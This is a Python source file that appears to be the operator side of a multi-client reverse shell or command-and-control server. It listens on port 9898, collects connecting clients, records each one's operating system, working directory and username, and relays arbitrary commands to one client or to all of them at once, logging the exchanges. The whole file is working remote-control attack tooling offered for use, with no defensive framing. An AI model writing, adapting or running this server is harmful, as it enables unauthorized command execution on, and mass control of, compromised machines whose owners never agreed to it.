import sys
import socket
import os
from datetime import datetime
import time


def select_conn():
    global s, all_connections, all_address, data
    stt = "{0:^10}  {1:^10}   {2:^10}"
    live_conn = stt.format('Sr.no.', 'IP Address', 'Port\n')
    stt = "{0:^5}  {1:^5}   {2:^5}\n"
    i = 0
    while i < len(all_connections):
        try:
            all_connections[i].send(str.encode('check4live'))
            txt = str(all_connections[i].recv(2048), 'utf-8')
            live_conn += stt.format(str(i + 1), str(all_address[i][0]), str(all_address[i][1]))
            txt = txt.split(',')
            data[i] = txt
            i += 1
        except socket.error:
            all_connections.pop(i)
            all_address.pop(i)
            data.pop(i)
        except KeyboardInterrupt:
            for xx in all_connections:
                xx.close()
            s.close()
            f.close()
            sys.exit()

    if len(all_address) > 0:
        print(live_conn)
        c = int(input('Choose any connection (Enter 0, to choose all): ')) - 1
        if c == -1:
            print('You are now broadcasting over all clients')
            try:
                f.write('\n***New Connection Established***\n')
                for c in range(len(data)):
                    f.write(
                        str(datetime.now()) + '------- IP: ' + str(all_address[c][0]) + '-------' + ' Port: ' +
                        str(all_address[c][1]) + '\n')
                    f.write(
                        'Operating System: ' + data[c][0] + '\n' + 'Current WD: ' + data[c][1] + '\n' + 'Username: ' +
                        data[c][2] + '\n')
                    print('You are connected to IP: ' + str(all_address[c][0]) + ' Port: ' + str(all_address[c][1]))
                    print('--Operating System: ' + data[c][0])
                    print('--Current WD: ' + data[c][1])
                    print('--Username: ' + data[c][2] + '\n')
                send_query(all_connections, True)
            except KeyboardInterrupt:
                print('Connection is closed...')
                for xx in all_connections:
                    xx.close()
                f.close()
                s.close()
                sys.exit()
        else:
            try:
                print('**'*30)
                print('You are connected to IP: ' + str(all_address[c][0]) + ' Port: ' + str(all_address[c][1]))
                f.write('\n***New Connection Established***\n' + str(datetime.now()) + '------- IP: ' + str(
                    all_address[c][0]) + '-------' + ' Port: ' + str(all_address[c][1]) + '\n')
                f.write(
                    'Operating System: ' + data[c][0] + '\n' + 'Current WD: ' + data[c][1] + '\n' + 'Username: ' +
                    data[c][2] + '\n')
                print('Operating System: ' + data[c][0])
                print('Current WD: ' + data[c][1])
                print('Username: ' + data[c][2] + '\n')
                send_query(all_connections[c], False, c)
            except IndexError:
                print('You entered wrong serial number, please relaunch this script!!!')
                select_conn()
            except KeyboardInterrupt:
                for xx in all_connections:
                    xx.close()
                s.close()
                f.close()
                sys.exit()
    else:
        print('No Live Connections Found!!!')
        sys.exit()


def create():
    global host, port, s, all_connections, all_address, f, data
    print('Searching all clients (Wait 15 Seconds)...')

    s1 = int(time.time())
    s2 = s1

    while (s2 - s1) <= 15:
        try:
            conn, address = s.accept()
            all_connections.append(conn)
            all_address.append(address)
            data.append('test')

        except socket.error:
            pass
        s2 = int(time.time())

    if len(all_connections) == 0:
        print('No clients found...Exiting!!!')
        s.close()
        sys.exit()
    else:
        select_conn()


def send_query(conn, amt=False, indd=-1):
    global all_address, data

    if not amt:
        conn = [conn]

    print('Send Your Commands.....If you want to close connection enter \'quit\'!!!')
    print('And if you want to connect with other ip enter \'list\'!!!')

    while True:
        try:
            command = input('command>>> ').strip()
            if len(command) > 0:
                if command == 'quit':
                    for i in conn:
                        i.send(str(command).encode())
                    try:
                        for i in conn:
                            i.close()
                    except socket.error as ee:
                        print(ee)
                    except KeyboardInterrupt:
                        s.close()
                        f.close()
                        sys.exit()
                    finally:
                        print('Connection is closed for ' + all_address[indd][0] + ' (' + data[indd][2] + ')')
                        for i in conn:
                            i.close()
                        select_conn()

                if command == 'list':
                    print('**'*30)
                    create()
                else:
                    f.write(
                        str(datetime.now()) + '-------' + ' Success/Command Executed ' + '-------' + str(command) +
                        '\n')

                    if len(conn) == 1:
                        for i in conn:
                            i.send(str(command).encode())
                            mess = str(i.recv(1024), 'utf-8')
                            if mess.find('Error') != -1:
                                f.write(
                                    str(datetime.now()) + '-------' + ' Success/Replied from ' + all_address[indd][
                                        0] + ' (' +
                                    data[indd][2] + ') -------' + str(mess) + '\n')
                            else:
                                f.write(
                                    str(datetime.now()) + '-------' + ' Error/Replied from ' + all_address[indd][
                                        0] + ' (' +
                                    data[indd][2] + ') -------' + str(mess) + '\n')
                            print('Reply from ' + all_address[indd][0] + ' (' + data[indd][2] + ') : ' + str(mess))
                    else:
                        for j, i in enumerate(conn):
                            i.send(str(command).encode())
                            mess = str(i.recv(1024), 'utf-8')
                            if mess.find('Error') != -1:
                                f.write(
                                    str(datetime.now()) + '-------' + ' Success/Replied from ' + all_address[j][
                                        0] + ' (' +
                                    data[j][2] + ') -------' + str(mess) + '\n')
                            else:
                                f.write(
                                    str(datetime.now()) + '-------' + ' Error/Replied from ' + all_address[j][
                                        0] + ' (' +
                                    data[j][2] + ') -------' + str(mess) + '\n')
                            print('Reply from ' + all_address[j][0] + ' (' + data[j][2] + ') : ' + str(mess))
            else:
                print('Invalid Command....Write something there!!!')
        except KeyboardInterrupt:
            print('Connection is closed...')
            f.close()
            for i in conn:
                i.close()
            s.close()
            sys.exit()


if os.path.exists('log.txt'):
    f = open('log.txt', 'a')
else:
    f = open('log.txt', 'w')

host = ''
port = 9898
data = []
all_connections = []
all_address = []
s = socket.socket()
s.settimeout(5)
try:
    s.bind((host, port))
    s.listen(5)
    create()
except socket.error as ee:
    print(ee)
    for i in all_connections:
        i.close()
    f.close()
    s.close()
    sys.exit()
